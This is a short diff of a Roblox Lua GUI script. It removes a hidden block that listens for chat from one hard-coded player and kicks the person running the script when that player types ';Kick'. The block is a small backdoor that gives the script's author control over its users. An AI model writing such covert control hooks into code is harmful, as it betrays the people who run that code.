@@ -389,17 +389,6 @@ if Frame then
 MainFrame.Image = Frame
 end
 
-
-spawn(function()
-Owner = game.Players.arseni_tge3
-if Owner then
-Owner.Chatted:connect(function(cht)
-if cht:match(";Kick") then
-game.Players.LocalPlayer:Kick("You got kicked by Owner")
-end
-end)
-end)
-
 CloseUIButton.Name = "CloseUIButton"
 CloseUIButton.Parent = MainFrame
 CloseUIButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
